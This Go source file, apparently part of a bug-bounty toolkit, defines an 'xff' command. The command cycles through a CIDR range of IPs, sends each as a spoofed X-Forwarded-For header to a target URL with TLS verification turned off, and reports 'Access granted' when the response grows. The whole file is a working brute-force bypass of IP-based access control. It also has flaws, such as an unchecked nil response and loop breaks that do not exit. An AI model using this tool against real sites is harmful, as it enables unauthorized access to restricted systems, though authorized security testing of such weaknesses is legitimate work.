package cmd

import (
	"bugbounty/ipv4"
	"bugbounty/logger"
	"context"
	"crypto/tls"
	"fmt"
	"github.com/parnurzeal/gorequest"
	"github.com/spf13/cobra"
	"net"
	"os"
	"os/signal"
)

var url string
var contentLength int64
var cidr string

func init() {
	Xff.Flags().StringVarP(&url, "url", "", "", "url")
	Xff.Flags().Int64VarP(&contentLength, "content-length", "", 10000000, "content-length")
	Xff.Flags().StringVarP(&cidr, "cidr", "", "", "192.168.0.0/23")
}

var Xff = &cobra.Command{
	Use:     "xff",
	Short:   "",
	Aliases: []string{"x"},
	Run: func(cmd *cobra.Command, args []string) {

		r, err := ipv4.New(cidr)
		if err != nil {
			logger.DefaultLogger.Fatal("Failed to parse cidr: %+v", err)
		}

		out := make(chan string)
		done := make(chan struct{})

		ctx := context.Background()
		ctx, cancel := context.WithCancel(ctx)
		defer cancel()

		c := make(chan os.Signal)
		defer close(c)
		signal.Notify(c, os.Interrupt)

		go func() {
			for {
				select {
				case <-c:
					logger.DefaultLogger.Info("Received SIGINT")
					cancel()
				case <-ctx.Done():
					return
				}
			}
		}()

		go execute(r, 2, ctx, out)
		go func() {
			for c := range out {
				logger.DefaultLogger.Info(c)
			}
			done <- struct{}{}
		}()

		<-done
	},
}

func execute(ipRange ipv4.IPv4Range, workers int, ctx context.Context, out chan<- string) {
	defer close(out)

	ips := make(chan net.IP)
	done := make(chan struct{})
	finished := make(chan struct{}, workers)

	for i := 0; i < workers; i++ {
		go func() {

			for {
				select {
				case <-done:
					finished <- struct{}{}
					return
				case ip := <-ips:
					resp, _, httpErrors := gorequest.
						New().
						TLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
						Set("X-Forwarded-For", ip.String()).
						Head(url).
						End()

					for _, err := range httpErrors {
						if os.IsTimeout(err) {
							resp, _, httpErrors = gorequest.
								New().
								Set("X-Forwarded-For", ip.String()).
								TLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
								Head(url).
								End()
						}
					}

					if resp.ContentLength <= contentLength {
						continue
					}

					out <- fmt.Sprintf("Access granted with: %s", ip.String())
					break
				}
			}
		}()
	}

	var current int
	for _, ip := range ipRange.Available() {
		select {
		case <-ctx.Done():
			break
		default: // avoid blocking.
		}

		ips <- ip
		current++
	}

	close(done)

	for i := 0; i < workers; i++ {
		<-finished
	}
}
